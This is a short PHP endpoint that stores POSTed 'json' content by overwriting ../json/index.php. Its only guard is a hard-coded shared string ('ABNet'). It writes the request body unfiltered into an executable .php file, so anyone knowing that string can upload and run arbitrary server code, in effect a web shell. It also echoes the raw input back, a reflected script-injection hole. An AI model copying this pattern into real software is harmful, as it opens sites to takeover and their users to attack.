<?php

    if($_POST["protection"]!="ABNet") {die();}
    
    echo($_POST["json"]);

    $phpDir = getCWD();
    chDir('../');
    if(!is_dir('json')) {mkDir('json');}
    chDir('json');
    unlink('index.php');
    $handle = fopen('index.php', 'w+');
    fwrite($handle, $_POST["json"]);
    fclose($handle);
    chDir($phpDir);

?>